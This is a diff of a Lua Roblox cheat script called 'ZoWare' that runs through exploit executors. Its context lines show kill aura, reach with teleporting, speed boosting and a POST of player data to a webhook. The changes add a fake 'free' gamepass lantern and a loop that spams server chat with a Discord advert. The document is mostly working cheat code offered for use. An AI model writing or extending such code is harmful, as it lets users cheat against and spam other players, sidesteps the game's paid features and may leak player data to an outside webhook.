@@ -1,5 +1,6 @@
 local amongusWS = false
 local amongusJP = false
+local amongusChatEvent = false
 
 if KRNL_LOADED or syn or jit then
     local Exploit = nil
@@ -60,9 +61,11 @@ local MainModule = {
 end
 
 function remLine(theirHrp)
-	if theirHrp.Parent.Torso:FindFirstChild("Beam") then
-		theirHrp.Parent.Torso:FindFirstChild("Beam"):Destroy()
-	end
+    if theirHrp.Parent:FindFirstChild("Torso") then
+        if theirHrp.Parent.Torso:FindFirstChild("Beam") then
+            theirHrp.Parent.Torso:FindFirstChild("Beam"):Destroy()
+        end
+    end
 end
 
 
@@ -125,7 +128,7 @@ function getClosestHrp()
                              end
                            end
                         end
-                        task.wait(.05)
+                        wait(.05)
                     end
                 end
             end
@@ -139,7 +142,7 @@ function getClosestHrp()
             if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                 cooldown = true
                 game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):Activate()
-                task.wait(tonumber(Delay)) 
+                wait(tonumber(Delay)) 
                 cooldown = false
             else
                 return
@@ -155,7 +158,7 @@ function getClosestHrp()
         if Humanoid.WalkSpeed <= 30 then
             amongusWS = true
             Humanoid.WalkSpeed += 4
-            task.wait(.4)
+            wait(.4)
             amongusWS = false
         else
             Notify({
@@ -258,7 +261,44 @@ function getClosestHrp()
         
         
         HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
-    end
+    end,
+
+    GetLanternFunction = function(LanternColor,State)
+       if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
+        if State == false then
+            if game.Players.LocalPlayer.Character.Torso:FindFirstChild("lanternfromebay") then
+             game.Players.LocalPlayer.Character.Torso:FindFirstChild("lanternfromebay"):Destroy()
+            else
+             return
+            end
+        else
+         if not game.Players.LocalPlayer.Character.Torso:FindFirstChild("lanternfromebay") then
+             local ebaylantern = Instance.new("SpotLight",game.Players.LocalPlayer.Character.Torso)
+             ebaylantern.Name = "lanternfromebay"
+             ebaylantern.Color = LanternColor
+             ebaylantern.Face = Enum.NormalId.Bottom
+             ebaylantern.Angle = 180
+             ebaylantern.Brightness = 9.16
+             ebaylantern.Shadows = false
+          else
+           if game.Players.LocalPlayer.Character.Torso:FindFirstChild("lanternfromebay").Color ~= LanternColor then
+               game.Players.LocalPlayer.Character.Torso:FindFirstChild("lanternfromebay").Color = LanternColor
+           else
+               return
+           end
+          end 
+        end
+       end
+    end,
+
+    ChatSpamFunction = function(text,delay)
+        if not amongusChatEvent then
+            amongusChatEvent = true
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(text), "All")
+            wait(delay)
+            amongusChatEvent = false
+        end
+    end,
 
     },
 }
@@ -284,6 +324,15 @@ local Settings = {
         Enabled = false,
         Material = "Fabric",
         Transparency = 0,
+    },
+    LanternSettings = {
+        Enabled = false,
+        Color = Color3.fromRGB(255,255,255),
+    },
+    SpamChatSettings = {
+        Enabled = false,
+        Text = "ZoWar3 ontop .gg/als",
+        Delay = 1,
     },
 }
 
@@ -332,6 +381,8 @@ local KillAuraSection = Main:CreateSector("KillAura", "left")
 local RangeSection = Main:CreateSector("Reach", "left")
 local WalkSpeedSector = Main:CreateSector("WalkSpeed", "left")
 local AntifFall = Main:CreateSector("AntiFall", "right")
+local FreeLanternGamepass = Main:CreateSector("Free Lantern", "right")
+local ChatSpam = Main:CreateSector("Chat Spam", "right")
 
 local KillAuraToggle = KillAuraSection:AddToggle('Enabled', false, function(State)
     Notify({
@@ -408,6 +459,31 @@ local FunniDropdown = AntifFall:AddDropdown("Material", {"Fabric","SmoothPlastic
     Settings.AntiFallSettings.Material = State
 end)
 
+local FreeEbayLantern = FreeLanternGamepass:AddToggle('Enabled', false, function(State)
+    Notify({
+        Title = "ZoWare V1.0",
+        Description = "Lantern Toggled",
+        Duration = 3
+    })
+    Settings.LanternSettings.Enabled = State
+end)
+
+local EbayLanternColorPicker = FreeLanternGamepass:AddColorpicker("Lantern Color",Color3.fromRGB(255, 255, 255), function(color)
+    Settings.LanternSettings.LanternColor = color
+end)
+
+local TextB = ChatSpam:AddTextbox("Spamming Text", "ZoWar3 ontop .gg/als", function(text)
+    Settings.SpamChatSettings.Text = tostring(text)
+end)
+
+local delayTreat = ChatSpam:AddSlider("Delay", 0, 1, 3, 1, function(Value)
+    Settings.SpamChatSettings.Delay = tonumber(Value)
+end)
+
+local plzTreatme = ChatSpam:AddToggle("Enabled", false,function(State)
+    Settings.SpamChatSettings.Enabled = State
+end)
+
 
 
 while wait(getgenv().LoopOverTime) do
@@ -418,6 +494,10 @@ while wait(getgenv().LoopOverTime) do
         MainModule.Functions.ReachFunction(Settings.Range.Range,Settings.Range.DrawLines,Settings.Range.TeleportBehind,Settings.Range.TeleportationType,Settings.Range.TeleportationDistance)
     end
        MainModule.Functions.AntiFallFunction(Settings.AntiFallSettings.Material,Settings.AntiFallSettings.Transparency,Settings.AntiFallSettings.Enabled)
+       MainModule.Functions.GetLanternFunction(Settings.LanternSettings.LanternColor,Settings.LanternSettings.Enabled)
+       if Settings.SpamChatSettings.Enabled == true then
+           MainModule.Functions.ChatSpamFunction(Settings.SpamChatSettings.Text,Settings.SpamChatSettings.Delay)
+       end
 end
 
 else
